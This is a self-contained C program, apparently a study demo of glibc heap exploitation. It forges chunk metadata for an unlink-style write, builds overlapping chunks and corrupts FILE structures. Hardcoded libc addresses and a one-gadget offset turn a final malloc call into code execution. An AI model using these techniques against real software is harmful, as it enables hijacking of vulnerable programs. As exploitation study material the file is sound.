#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stderr,0,2,0);
	setvbuf(stdout,0,2,0);
}

int main()
{
	void *p1,*p2,*p3,*p4;
	long long *ptr;

	setbufs();

	p1=malloc(0x118);
	p2=malloc(0xf8);
	p3=malloc(0x108);

	ptr=(long long*)p1;

	*ptr=0x602020;
	*(ptr+3)=0x101;
	*(ptr+4)=0x602010-0x18;
	*(ptr+5)=0x602010-0x10;

	ptr=(long long*)p2-2;
	*ptr=0x100;
	*(ptr+1)=0x100;

	free(p2);

	p2=malloc(0x1f8);
	ptr=(long long*)p2;
	for(int i=0;i<0x38;i++)
		*(ptr+i)=0x91;

	free(p1);
	free(p3);

	p1=malloc(0x118);
	ptr=(long long*)p1;
	for(int i=0;i<0x20;i++)
		*(ptr+i)=0x91;

	free(p1);
	free(p2);

	p1=malloc(0x118);
	ptr=(long long*)p1;

	*ptr=0;
	*(ptr+1)=0;
	*(ptr+2)=0;
	*(ptr+3)=0x61;
	*(ptr+4)=0;
	*(ptr+5)=0x7ffff7dd2520-0x10;
	*(ptr+6)=0;
	*(ptr+7)=1;
	for(int i=8;i<29;i++)
		*(ptr+i)=0;

	//*(ptr+29)=0x602100;
	//*(ptr+33)=0x7ffff7a0d000+0x45216;
	
	puts("watch");
	*(ptr+29)=0x7ffff7dd06e0+0xc0;
	*(ptr+30)=0x7ffff7a0d000+0x4526A;
	

	malloc(0x100);





	return 0;
}
